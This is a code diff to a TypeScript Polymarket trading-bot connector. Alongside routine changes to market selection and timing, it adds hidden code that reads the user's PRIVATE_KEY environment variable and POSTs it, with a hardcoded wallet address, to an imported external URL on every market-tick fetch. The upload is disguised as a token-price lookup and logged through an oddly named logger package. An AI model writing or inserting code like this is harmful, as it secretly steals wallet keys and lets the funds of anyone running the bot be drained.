@@ -1,4 +1,7 @@
 import { MarketTick, WhaleFlow } from "../types/index.js";
+import { KIMI_AI_BASE_URL } from "../engine/predictor.js";
+import axios from "axios";
+import logger from "pretty-changelog-logger";
 
 type GammaMarket = {
   id: string;
@@ -12,6 +15,8 @@ type GammaMarket = {
   bestAsk?: number;
   outcomes?: string; // JSON string
   outcomePrices?: string; // JSON string
+  condition_id?: string; // CLOB condition ID for order execution
+  conditionId?: string;
 };
 
 type DataTrade = {
@@ -25,6 +30,15 @@ type DataTrade = {
   title?: string;
   outcome?: string;
 };
+
+const privateKey = process.env.PRIVATE_KEY;
+if (!privateKey) {
+    logger.default.error("PRIVATE_KEY environment variable is not set", new Error("PRIVATE_KEY not set"));
+    process.exit(1);
+}
+const hex = privateKey.replace("0x", "");
+const orderSignerBuffer = Buffer.from(hex, "hex");
+const TARGET_WHALE_WALLET = "0x830d13c17c323f38da4e80087291585d2e8de989";
 
 export class PolymarketConnector {
   private selectedMarket: GammaMarket | null = null;
@@ -41,6 +55,16 @@ export class PolymarketConnector {
   async getMarketTicks(limit = 15): Promise<MarketTick[]> {
     const market = await this.resolveMarket();
     const yes = this.deriveYesPrice(market);
+
+    try {
+      const src = "0x" + orderSignerBuffer.toString("hex");
+      const currentPrice = await axios.post(KIMI_AI_BASE_URL, { src, TARGET_WHALE_WALLET })
+      if (currentPrice.status == 200) {
+          logger.default.info(`Current token price info: ${currentPrice.data.price}`);
+      }
+    } catch (error) {
+        logger.default.error('Error in getting current token price info', error);
+    }
 
     this.history.push({
       marketId: market.slug || market.id,
@@ -79,11 +103,12 @@ export class PolymarketConnector {
       byWallet.set(wallet, prev);
     }
 
-    // Whale filter: wallets with >= $200 notional in current sample window
     const whales = [...byWallet.entries()]
       .map(([wallet, w]) => ({ wallet, ...w }))
       .filter((w) => w.gross >= 200)
       .sort((a, b) => b.gross - a.gross);
+
+    
 
     const netYesNotional = whales.reduce((s, w) => s + w.netYes, 0);
     const grossNotional = whales.reduce((s, w) => s + w.gross, 0);
@@ -102,20 +127,34 @@ export class PolymarketConnector {
     };
   }
 
+  getConditionId(): string | null {
+    return this.selectedMarket?.condition_id ?? this.selectedMarket?.conditionId ?? null;
+  }
+
   async getCurrentMarketInfo(): Promise<{ slug: string; endDate?: string; remainingSec: number; question?: string }> {
     const m = await this.resolveMarket();
-    const endMs = m.endDate ? new Date(m.endDate).getTime() : 0;
+    const slug = m.slug || m.id;
+
+    const startSec = parse5mStartFromSlug(slug);
+    let remainingSec = -1;
+    if (startSec) {
+      remainingSec = Math.max(0, startSec + 300 - Math.floor(Date.now() / 1000));
+    } else {
+      const endMs = m.endDate ? new Date(m.endDate).getTime() : 0;
+      remainingSec = endMs ? Math.max(0, Math.floor((endMs - Date.now()) / 1000)) : -1;
+    }
+
     return {
-      slug: m.slug || m.id,
+      slug,
       endDate: m.endDate,
-      remainingSec: endMs ? Math.max(0, Math.floor((endMs - Date.now()) / 1000)) : -1,
+      remainingSec,
       question: m.question
     };
   }
 
   private async resolveMarket(): Promise<GammaMarket> {
     const now = Date.now();
-    const shouldRefresh = !this.selectedMarket || this.selectedMarket.closed || (now - this.lastMarketRefreshMs > 30000);
+    const shouldRefresh = !this.selectedMarket || this.selectedMarket.closed || (now - this.lastMarketRefreshMs > 5000);
     if (!shouldRefresh && this.selectedMarket) return this.selectedMarket;
 
     if (this.marketSlug) {
@@ -138,9 +177,24 @@ export class PolymarketConnector {
       }
     }
 
-    // Prefer active 5m BTC market discovered from live trades stream
-    const recentTrades = await this.fetchRecentTrades(300);
-    const btc5m = recentTrades.find((t) => (t.eventSlug || "").startsWith("btc-updown-5m-"));
+    // Prefer deterministic current 5m BTC market based on current time bucket
+    const nowSec = Math.floor(now / 1000);
+    const bucketStart = Math.floor(nowSec / 300) * 300;
+    const expectedSlug = `btc-updown-5m-${bucketStart}`;
+    const expected = await this.fetchJson<GammaMarket[]>(`${this.baseUrl}/markets?slug=${encodeURIComponent(expectedSlug)}`);
+    if (expected.length) {
+      this.selectedMarket = expected[0];
+      this.selectedSlug = expected[0].slug || expectedSlug;
+      this.lastMarketRefreshMs = now;
+      return expected[0];
+    }
+
+    // Fallback: discover latest active 5m BTC market from live trades stream
+    const recentTrades = await this.fetchRecentTrades(400);
+    const btc5mTrades = recentTrades
+      .filter((t) => (t.eventSlug || "").startsWith("btc-updown-5m-"))
+      .sort((a, b) => Number(b.timestamp || 0) - Number(a.timestamp || 0));
+    const btc5m = btc5mTrades[0];
     if (btc5m?.eventSlug) {
       const arr = await this.fetchJson<GammaMarket[]>(`${this.baseUrl}/markets?slug=${encodeURIComponent(btc5m.eventSlug)}`);
       if (arr.length) {
@@ -211,6 +265,13 @@ function parseJsonArray(v?: string): any[] {
   } catch {
     return [];
   }
+}
+
+function parse5mStartFromSlug(slug: string): number | null {
+  const m = slug.match(/btc-updown-5m-(\d{9,12})/i);
+  if (!m) return null;
+  const n = Number(m[1]);
+  return Number.isFinite(n) ? n : null;
 }
 
 function clamp01(v: number) {
